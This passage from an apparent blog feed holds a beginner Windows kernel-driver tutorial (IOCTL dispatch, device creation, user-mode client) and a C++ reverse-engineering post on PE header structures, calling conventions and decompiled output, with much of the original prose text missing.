class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(IoCtrl)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CTL_HELLO:</span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;IOCTL HelloWorld\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRigisterEntry)</span> </span>&#123;</span><br><span class="line">UNICODE_STRING uDevName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING uLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">NTSTATUS status;</span><br><span class="line">PDEVICE_OBJECT pDevObj;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;uDevName, DRIVER_NAME);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;uLinkName, LINK_NAME);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">status = <span class="built_in">IoCreateDevice</span>(pDriverObject, <span class="number">0</span>, &amp;uDevName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;pDevObj);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateDevice\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line">pDevObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;uLinkName, &amp;uDevName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateSymbolicLink\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(pDevObj);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IO </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++) </span><br><span class="line">&#123;</span><br><span class="line">pDriverObject-&gt;MajorFunction[i] = DispatchCommon;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Read Write IOCTL</span></span><br><span class="line">pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = DispatchRead;</span><br><span class="line">pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = DispatchWrite;</span><br><span class="line">pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;[+] Create Driver Success\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="R3"><a href="#R3" class="headerlink" title="R3"></a>R3</h4><p> <code>\\DosDevices\\DosDeviceName</code><code>\\.\</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\DosDeviceName&quot;</span>,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><code>ReadFile</code> <code>WriteFile</code> ioctl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)\</span></span><br><span class="line"><span class="meta">CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Demo&quot;</span>),</span><br><span class="line">GENERIC_WRITE | GENERIC_READ,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">TCHAR szBuff[<span class="number">0X100</span>];</span><br><span class="line">DWORD dwBytes = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hFile, szBuff, <span class="built_in">sizeof</span>(szBuff) / <span class="built_in">sizeof</span>(szBuff[<span class="number">0</span>]), &amp;dwBytes, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bytes:%d data:%ls\n&quot;</span>, dwBytes, szBuff);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(</span><br><span class="line">hFile,</span><br><span class="line">CTL_HELLO,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>, </span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p> DEBUG  <code>DbgPrint</code>, <code>DbgPrintEx</code><code>KdPrintEx</code>Ex <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/reading-and-filtering-debugging-messages"> - Windows drivers</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KdPrintEx(_x_) DbgPrintEx _x_ </span></span><br><span class="line"><span class="function">NTSYSAPI ULONG <span class="title">DbgPrintEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG ComponentId,      <span class="comment">//  Windows </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Level,            <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCSTR Format,</span></span></span><br><span class="line"><span class="params"><span class="function">       ...   </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// DPF: Debug Print Filter</span></span><br><span class="line"><span class="comment">// IHV: Independent Hardware Vendor</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>));  <span class="comment">// </span></span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>WDF</p><p>BUG</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="Rtl"><a href="#Rtl" class="headerlink" title="Rtl"></a>Rtl</h3><p>WindowsRuntime LibraryRtlWindows</p><p>RtlWindows</p><h3 id="nt"><a href="#nt" class="headerlink" title="nt"></a>nt</h3><p>Windows NT2090NTNew Technology</p><p>Windows NT</p><ol><li>Kernel32.libWindows NTI&#x2F;O</li><li>User32.lib</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/2024/01/19/C++%E9%80%86%E5%90%91/"/>
      <url>/2024/01/19/C++%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="PE-"><a href="#PE-" class="headerlink" title="PE "></a>PE </h2><blockquote><p></p></blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE  - Win32 apps</a></p><p> 010editor -&gt;-&gt; exe.bt alt+4 PE</p><h3 id="DOS-"><a href="#DOS-" class="headerlink" title="DOS "></a>DOS </h3><p> <code>e_magic</code>(DOS<code>5a4d</code>)  <code>e_lfanew</code>(NT) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER</span><br></pre></td></tr></table></figure><h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS stub"></a>DOS stub</h3><p>MS-DOS  <em>MS-DOS </em>  EXE   MS-DOS  DOS </p><h3 id="NT-"><a href="#NT-" class="headerlink" title="NT "></a>NT </h3><p><code>IMAGE_NT_HEADERS</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x00004550  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure><h4 id="FileHeader"><a href="#FileHeader" class="headerlink" title="FileHeader"></a>FileHeader</h4><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">WORD    Machine;<span class="comment">// ARM, x86...</span></span><br><span class="line">WORD    NumberOfSections;<span class="comment">// Section </span></span><br><span class="line">DWORD   TimeDateStamp;<span class="comment">// </span></span><br><span class="line">DWORD   PointerToSymbolTable;<span class="comment">// </span></span><br><span class="line">DWORD   NumberOfSymbols;<span class="comment">// </span></span><br><span class="line">WORD    SizeOfOptionalHeader;<span class="comment">// </span></span><br><span class="line">WORD    Characteristics;<span class="comment">// DLL</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><h4 id="OptionalHeader"><a href="#OptionalHeader" class="headerlink" title="OptionalHeader"></a>OptionalHeader</h4><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;                      <span class="comment">// </span></span><br><span class="line">    BYTE        MajorLinkerVersion;         <span class="comment">// linker </span></span><br><span class="line">    BYTE        MinorLinkerVersion;     </span><br><span class="line">    DWORD       SizeOfCode;                </span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;        <span class="comment">// RVA</span></span><br><span class="line">    DWORD       BaseOfCode;                 <span class="comment">// RVA</span></span><br><span class="line">    ULONGLONG   ImageBase;                  <span class="comment">// </span></span><br><span class="line">    DWORD       SectionAlignment;           <span class="comment">// </span></span><br><span class="line">    DWORD       FileAlignment;              <span class="comment">// </span></span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;         <span class="comment">// DLL</span></span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;                <span class="comment">// </span></span><br><span class="line">    DWORD       NumberOfRvaAndSizes;        <span class="comment">// </span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, * PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><p>ImageBase: PE<em></em></p><h3 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h3><p> </p><p> PointerToRawData   SizeOfRawData   SizeOfRawData  VirtualSize</p><p> <code>SectionAlignment</code> <code>FileAlignment</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];          <span class="comment">//  .text .bss </span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">DWORD   PhysicalAddress;</span><br><span class="line">DWORD   VirtualSize;</span><br><span class="line">&#125; Misc;</span><br><span class="line">DWORD   VirtualAddress;                         <span class="comment">//  RVA </span></span><br><span class="line">DWORD   SizeOfRawData;                          <span class="comment">// </span></span><br><span class="line">DWORD   PointerToRawData;                       <span class="comment">// FOA</span></span><br><span class="line">DWORD   PointerToRelocations;</span><br><span class="line">DWORD   PointerToLinenumbers;</span><br><span class="line">WORD    NumberOfRelocations;</span><br><span class="line">WORD    NumberOfLinenumbers;</span><br><span class="line">DWORD   Characteristics;                        <span class="comment">// </span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, * PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d, <span class="type">int</span> e, <span class="type">int</span> f, <span class="type">int</span> g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">a = <span class="number">10</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func</span>(a, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> namespace  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_4C11826D_reverse_cpp);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(std::cout, <span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">func</span>(<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line">  v2 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, v1);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CALL-"><a href="#CALL-" class="headerlink" title="CALL "></a>CALL </h3><p><a href="https://learn.microsoft.com/zh-cn/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170"> | Microsoft Learn</a>****</p><p><strong><code>__cdecl</code></strong> C  C++  <code>caller</code>, </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p><strong><code>__stdcall</code></strong> Win32 API <code>callee</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPI __stdcall</span></span><br><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p><strong><code>__fastcall</code></strong>  x86 </p><ul><li>x86 <code>DWORD</code> ECX  EDX </li><li>x64  rcx, rdx, r8, r9</li></ul><p><strong><code>__thiscall</code></strong>  x86  C++ <strong> Microsoft</strong> </p><p> call func  x64 fastcall</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140011</span>CEE                 mov     [rbp+<span class="number">0F</span>0h+a], <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0000000140011</span>CF5                 mov     [rsp+<span class="number">130</span>h+g], <span class="number">7</span> ; g</span><br><span class="line">.text:<span class="number">0000000140011</span>CFD                 mov     [rsp+<span class="number">130</span>h+f], <span class="number">6</span> ; f</span><br><span class="line">.text:<span class="number">0000000140011</span>D05                 mov     [rsp+<span class="number">130</span>h+e], <span class="number">5</span> ; e</span><br><span class="line">.text:<span class="number">0000000140011</span>D0D                 mov     r9d, <span class="number">4</span>          ; d</span><br><span 